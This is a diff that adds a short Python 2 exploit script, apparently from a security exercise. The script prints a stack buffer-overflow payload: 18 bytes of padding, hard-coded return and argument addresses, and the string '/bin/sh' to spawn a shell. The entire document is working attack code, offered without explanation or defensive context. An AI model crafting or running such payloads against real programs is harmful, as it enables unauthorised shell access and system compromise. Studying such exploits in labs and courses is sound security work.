@@ -1,0 +1,5 @@
+from shellcode import shellcode
+from struct import pack
+
+print "A"*18 + "\x42\xed\xfe\xbf" + "\xed\x8e\x04\x08" + "\x44\xed\xfe\xbf" + "\x2f\x62\x69\x6e\x2f\x73\x68" + "\0" 
+
